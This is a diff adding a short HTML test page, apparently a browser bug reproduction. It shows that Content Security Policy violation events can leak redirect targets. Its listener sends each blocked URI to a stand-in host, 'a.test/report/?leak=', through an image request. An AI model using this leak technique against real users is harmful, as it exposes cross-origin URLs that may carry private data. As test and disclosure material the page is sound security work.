@@ -1,0 +1,32 @@
+<html>
+  <head>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' vulnerabledoma.in">
+  </head>
+  <body>
+    <button onclick="test1()">TEST 1</button>
+    <button onclick="test2()">TEST 2</button>
+    <button onclick="test3()">TEST 3</button>
+
+    <script>
+      document.addEventListener('securitypolicyviolation', e => {
+        const img = document.createElement('img');
+        img.src = 'https://a.test/report/?leak=f1542194&blockedURI=' + encodeURIComponent(e.blockedURI);
+        document.body.appendChild(img);
+      });
+
+      function test1() {
+        document.location.href = 'https://vulnerabledoma.in/fx_csp_violation_leak_302.php';
+      }
+
+      function test2() {
+        document.location.href = 'https://www.vulnerabledoma.in/path?query';
+      }
+
+      function test3() {
+        const a = document.createElement('a');
+        a.href = 'https://www.vulnerabledoma.in/path?query';
+        a.click();
+      }
+    </script>
+  </body>
+</html>
